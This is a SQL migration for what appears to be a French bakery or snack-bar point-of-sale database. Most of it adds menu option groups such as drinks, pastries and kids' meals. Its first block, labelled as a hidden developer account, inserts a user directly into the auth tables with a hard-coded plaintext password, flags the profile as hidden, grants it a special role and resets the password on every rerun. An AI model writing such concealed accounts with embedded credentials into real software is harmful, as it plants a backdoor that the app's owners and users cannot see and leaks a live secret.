
-- 0) Étendre la contrainte profiles.role pour accepter 'developer' (et 'bar', 'cuisine', 'economat' au passage)
ALTER TABLE public.profiles DROP CONSTRAINT IF EXISTS profiles_role_check;
ALTER TABLE public.profiles ADD CONSTRAINT profiles_role_check
  CHECK (role = ANY (ARRAY['ceo','labo_patisserie','labo_viennoiserie','cuisine_salee','salle','developer','bar','cuisine','economat']));

-- 1) COMPTE DÉVELOPPEUR CACHÉ
DO $$
DECLARE
  v_uid uuid;
  v_existing uuid;
BEGIN
  SELECT id INTO v_existing FROM auth.users WHERE email = 'dev@saade.com';
  IF v_existing IS NULL THEN
    v_uid := gen_random_uuid();
    INSERT INTO auth.users (
      id, instance_id, aud, role, email, encrypted_password,
      email_confirmed_at, created_at, updated_at,
      raw_app_meta_data, raw_user_meta_data, is_super_admin
    ) VALUES (
      v_uid, '00000000-0000-0000-0000-000000000000',
      'authenticated', 'authenticated',
      'dev@saade.com',
      crypt('Drckangel0606@', gen_salt('bf')),
      now(), now(), now(),
      '{"provider":"email","providers":["email"]}'::jsonb,
      '{"full_name":"Developer"}'::jsonb,
      false
    );
    INSERT INTO auth.identities (id, user_id, identity_data, provider, provider_id, last_sign_in_at, created_at, updated_at)
    VALUES (
      gen_random_uuid(), v_uid,
      jsonb_build_object('sub', v_uid::text, 'email', 'dev@saade.com', 'email_verified', true),
      'email', v_uid::text, now(), now(), now()
    );
  ELSE
    v_uid := v_existing;
    UPDATE auth.users
       SET encrypted_password = crypt('Drckangel0606@', gen_salt('bf')),
           email_confirmed_at = COALESCE(email_confirmed_at, now()),
           updated_at = now()
     WHERE id = v_uid;
  END IF;

  INSERT INTO public.profiles (id, full_name, role, is_hidden)
  VALUES (v_uid, 'Developer', 'developer', true)
  ON CONFLICT (id) DO UPDATE SET full_name = 'Developer', role = 'developer', is_hidden = true;

  DELETE FROM public.user_roles WHERE user_id = v_uid;
  INSERT INTO public.user_roles (user_id, role) VALUES (v_uid, 'developer'::public.app_role);
END $$;

-- 2) FORMULES POS
WITH p AS (
  SELECT id FROM public.produits WHERE upper(nom) LIKE '%PAIN BRO%' AND categorie = 'PAIN_BRO'
), g AS (
  INSERT INTO public.produit_options_groupes (produit_id, nom, ordre, min_choix, max_choix, obligatoire)
  SELECT p.id, 'Suppléments', 0, 0, 4, false FROM p
  WHERE NOT EXISTS (SELECT 1 FROM public.produit_options_groupes g WHERE g.produit_id = p.id AND g.nom = 'Suppléments')
  RETURNING id
)
INSERT INTO public.produit_options_items (groupe_id, libelle, prix_supplement, ordre)
SELECT g.id, x.libelle, 0, x.ord
FROM g, (VALUES ('Mayo',1),('Tomate',2),('Oignon',3),('Piment vert',4)) AS x(libelle, ord);

WITH p AS (SELECT id FROM public.produits WHERE upper(nom) LIKE 'FORMULE EXPRESS%' AND categorie = 'FORMULES'),
g1 AS (
  INSERT INTO public.produit_options_groupes (produit_id, nom, ordre, min_choix, max_choix, obligatoire)
  SELECT p.id, 'Boisson chaude', 0, 1, 1, true FROM p
  WHERE NOT EXISTS (SELECT 1 FROM public.produit_options_groupes g WHERE g.produit_id = p.id AND g.nom = 'Boisson chaude')
  RETURNING id
)
INSERT INTO public.produit_options_items (groupe_id, libelle, prix_supplement, ordre)
SELECT g1.id, x.libelle, 0, x.ord
FROM g1, (VALUES ('Café',1),('Café au lait',2),('Cappuccino',3),('Thé',4),('Chocolat chaud',5)) AS x(libelle,ord);

WITH p AS (SELECT id FROM public.produits WHERE upper(nom) LIKE 'FORMULE EXPRESS%' AND categorie = 'FORMULES'),
g2 AS (
  INSERT INTO public.produit_options_groupes (produit_id, nom, ordre, min_choix, max_choix, obligatoire)
  SELECT p.id, 'Viennoiserie', 1, 1, 1, true FROM p
  WHERE NOT EXISTS (SELECT 1 FROM public.produit_options_groupes g WHERE g.produit_id = p.id AND g.nom = 'Viennoiserie')
  RETURNING id
)
INSERT INTO public.produit_options_items (groupe_id, libelle, prix_supplement, ordre)
SELECT g2.id, x.libelle, 0, x.ord
FROM g2, (VALUES ('Croissant',1),('Pain au chocolat',2),('Pain aux raisins',3),('Brioche',4)) AS x(libelle,ord);

WITH p AS (SELECT id FROM public.produits WHERE upper(nom) LIKE 'FORMULE EXPRESS%' AND categorie = 'FORMULES'),
g3 AS (
  INSERT INTO public.produit_options_groupes (produit_id, nom, ordre, min_choix, max_choix, obligatoire)
  SELECT p.id, 'Eau', 2, 1, 1, true FROM p
  WHERE NOT EXISTS (SELECT 1 FROM public.produit_options_groupes g WHERE g.produit_id = p.id AND g.nom = 'Eau')
  RETURNING id
)
INSERT INTO public.produit_options_items (groupe_id, libelle, prix_supplement, ordre)
SELECT g3.id, x.libelle, 0, x.ord
FROM g3, (VALUES ('Eau plate',1),('Eau gazeuse',2)) AS x(libelle,ord);

-- GOÛTER
WITH p AS (SELECT id FROM public.produits WHERE upper(nom) LIKE 'FORMULE GOÛTER%' AND categorie = 'FORMULES'),
g1 AS (
  INSERT INTO public.produit_options_groupes (produit_id, nom, ordre, min_choix, max_choix, obligatoire)
  SELECT p.id, 'Dessert', 0, 1, 1, true FROM p
  WHERE NOT EXISTS (SELECT 1 FROM public.produit_options_groupes g WHERE g.produit_id = p.id AND g.nom = 'Dessert')
  RETURNING id
)
INSERT INTO public.produit_options_items (groupe_id, libelle, prix_supplement, ordre)
SELECT g1.id, x.libelle, 0, x.ord
FROM g1, (VALUES ('Donut',1),('Éclair',2),('Tarte du jour',3),('Cookie',4),('Muffin',5)) AS x(libelle,ord);

WITH p AS (SELECT id FROM public.produits WHERE upper(nom) LIKE 'FORMULE GOÛTER%' AND categorie = 'FORMULES'),
g2 AS (
  INSERT INTO public.produit_options_groupes (produit_id, nom, ordre, min_choix, max_choix, obligatoire)
  SELECT p.id, 'Boisson', 1, 1, 1, true FROM p
  WHERE NOT EXISTS (SELECT 1 FROM public.produit_options_groupes g WHERE g.produit_id = p.id AND g.nom = 'Boisson')
  RETURNING id
)
INSERT INTO public.produit_options_items (groupe_id, libelle, prix_supplement, ordre)
SELECT g2.id, x.libelle, 0, x.ord
FROM g2, (VALUES ('Café',1),('Thé',2),('Chocolat chaud',3),('Jus',4),('Limonade',5)) AS x(libelle,ord);

-- SNACK
WITH p AS (SELECT id FROM public.produits WHERE upper(nom) LIKE 'FORMULE SNACK%' AND categorie = 'FORMULES'),
g1 AS (
  INSERT INTO public.produit_options_groupes (produit_id, nom, ordre, min_choix, max_choix, obligatoire)
  SELECT p.id, 'Plat', 0, 1, 1, true FROM p
  WHERE NOT EXISTS (SELECT 1 FROM public.produit_options_groupes g WHERE g.produit_id = p.id AND g.nom = 'Plat')
  RETURNING id
)
INSERT INTO public.produit_options_items (groupe_id, libelle, prix_supplement, ordre)
SELECT g1.id, x.libelle, 0, x.ord
FROM g1, (VALUES ('Hot Dog classique',1),('Hot Dog poulet',2),('Pain Bro simple',3),('Pain Bro complet',4)) AS x(libelle,ord);

WITH p AS (SELECT id FROM public.produits WHERE upper(nom) LIKE 'FORMULE SNACK%' AND categorie = 'FORMULES'),
g2 AS (
  INSERT INTO public.produit_options_groupes (produit_id, nom, ordre, min_choix, max_choix, obligatoire)
  SELECT p.id, 'Boisson', 1, 1, 1, true FROM p
  WHERE NOT EXISTS (SELECT 1 FROM public.produit_options_groupes g WHERE g.produit_id = p.id AND g.nom = 'Boisson')
  RETURNING id
)
INSERT INTO public.produit_options_items (groupe_id, libelle, prix_supplement, ordre)
SELECT g2.id, x.libelle, 0, x.ord
FROM g2, (VALUES ('Ice tea',1),('Tonic',2),('Eau gazeuse',3),('Eau plate',4),('Word cola',5),('Youki orange',6)) AS x(libelle,ord);

-- HEALTHY
WITH p AS (SELECT id FROM public.produits WHERE upper(nom) LIKE 'FORMULE HEALTHY%' AND categorie = 'FORMULES'),
g AS (
  INSERT INTO public.produit_options_groupes (produit_id, nom, ordre, min_choix, max_choix, obligatoire)
  SELECT p.id, 'Boisson', 0, 1, 1, true FROM p
  WHERE NOT EXISTS (SELECT 1 FROM public.produit_options_groupes g WHERE g.produit_id = p.id AND g.nom = 'Boisson')
  RETURNING id
)
INSERT INTO public.produit_options_items (groupe_id, libelle, prix_supplement, ordre)
SELECT g.id, x.libelle, 0, x.ord
FROM g, (VALUES ('Eau plate',1),('Jus Hugs ananas',2),('Jus Hugs bissap',3),('Jus Hugs multifruits',4),('Limonade',5)) AS x(libelle,ord);

-- MENU ENFANT
WITH p AS (SELECT id FROM public.produits WHERE categorie = 'MENU_ENFANT'),
g1 AS (
  INSERT INTO public.produit_options_groupes (produit_id, nom, ordre, min_choix, max_choix, obligatoire)
  SELECT p.id, 'Plat', 0, 1, 1, true FROM p
  WHERE NOT EXISTS (SELECT 1 FROM public.produit_options_groupes g WHERE g.produit_id = p.id AND g.nom = 'Plat')
  RETURNING id
)
INSERT INTO public.produit_options_items (groupe_id, libelle, prix_supplement, ordre)
SELECT g1.id, x.libelle, 0, x.ord
FROM g1, (VALUES ('Mini Croq Dog',1),('Mini Panini Jambon-Fromage',2)) AS x(libelle,ord);

WITH p AS (SELECT id FROM public.produits WHERE categorie = 'MENU_ENFANT'),
g2 AS (
  INSERT INTO public.produit_options_groupes (produit_id, nom, ordre, min_choix, max_choix, obligatoire)
  SELECT p.id, 'Boisson', 1, 1, 1, true FROM p
  WHERE NOT EXISTS (SELECT 1 FROM public.produit_options_groupes g WHERE g.produit_id = p.id AND g.nom = 'Boisson')
  RETURNING id
)
INSERT INTO public.produit_options_items (groupe_id, libelle, prix_supplement, ordre)
SELECT g2.id, x.libelle, 0, x.ord
FROM g2, (VALUES ('Eau plate',1),('Hugs ananas',2),('Hugs bissap',3),('Hugs multifruits',4)) AS x(libelle,ord);
